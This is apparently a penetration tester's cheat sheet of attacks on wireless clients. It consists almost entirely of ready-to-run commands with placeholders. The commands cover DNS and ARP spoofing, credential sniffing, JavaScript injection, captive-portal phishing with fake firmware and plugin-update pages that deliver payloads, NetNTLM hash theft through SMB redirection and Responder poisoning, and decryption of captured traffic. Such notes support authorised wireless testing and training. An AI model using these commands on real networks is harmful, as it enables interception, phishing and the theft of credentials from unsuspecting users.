# Clients Attacks:    
##	Standard Man-in-the-Middle Attacks    
        DNS Spoofing  
        	Bettercap > dns.spoof module  
		ARP Spoofing    
		-- Not needed when client connected to rogue AP because attacker already in position of MitM    
			Bettercap > arp.spoof module    
		Credentials Sniffing    
			Bettercap > net.sniff module    
			Pcredz -i <interface> -v    
			python net-creds.py -i <interface>    
			dsniff -i <interface>    
		JS Injection    
			Bettercap > caplet beef-active    
##	Captive Portal Attack    
		Phishing (Social Engineering)    
			wifiphisher -aI <interface_rogue_AP> -eI <interface_deauthenticating> -iI <internet_interface> -p firmware-upgrade --handshake-capture handshake.pcap --essid <target_SSID> -kN    
			wifipumpkin3 --xpulp "set interface wlan0; set ssid <SSID>; set proxy captiveflask; start"    
			Add --captive-portal in eaphammer command    
			airgeddon.sh    
			fluxion.sh    
		Payload Delivery    
			wifiphisher -aI <interface_rogue_AP> -jI <interface_jamming> -p plugin_update --handshake-capture handshake.pcap -kN    
##	NetNTLM Hash Stealing    
		Hostile Portal Attack (Redirect to SMB)    
			Add --hostile-portal in eaphammer command    
			HTTP traffic redirected to SMB share on attacker's machine    
		NBT-NS/LLMNR Poisoning    
			Responder.py -I <interface> -wrf    
##	Passive Sniffing    
		Traffic Decryption    
			Wireshark (requires PSK or PMK)    
			airdecap-ng -e <ESSID> -p <passphrase> <capture_pcap>    
